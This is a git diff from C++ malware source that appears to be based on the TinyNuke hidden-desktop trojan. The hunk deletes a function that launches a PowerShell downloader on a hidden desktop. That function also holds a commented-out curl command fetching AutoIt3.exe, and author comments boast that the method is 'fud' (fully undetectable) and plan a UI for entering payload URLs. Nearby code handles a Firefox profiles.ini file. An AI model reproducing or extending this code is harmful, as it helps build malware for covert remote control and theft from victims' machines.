@@ -453,33 +453,7 @@ exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);
 
-
-
 }
-
-
-static void tryingtorunpowershelldownloader()
-{
-    char path[MAX_PATH] = { 0 };
-    Funcs::pLstrcpyA(path, Strs::hd8);
-    Funcs::pLstrcatA(path, Strs::downloader);
-
-    STARTUPINFOA startupInfo = { 0 };
-    startupInfo.cb = sizeof(startupInfo);
-    startupInfo.lpDesktop = g_desktopName;// <=
-    PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
-  //=>  system("cmd  /c  curl %filetodownload% --output AutoIt3.exe | clip");
-    // is this curl command going to be the command you use? i'm using this yes it is fud :D
-    //but now i need the code to open a text area and ask for url and replace strs::downloader code and exec
-    //got it but i'm sooo sleepy, i'm going to sleep when i wake up we will finish it fast, why don't you make UI for it why u are using Console?
-    // some reasons one of them is because tinynuke was a console app and i was lazy to convert all of the files to a ui lol
-    // you can create new ui form in the same project i think let me see
-    // oh this is got got it , you can use Qt application if you want | i have qt but never really use it, go to sleep and can you help me with this + show me qt in the morning?
-    // absolutely :) alright bet
-
-}
-
 
 static void StartPowershell()
 {
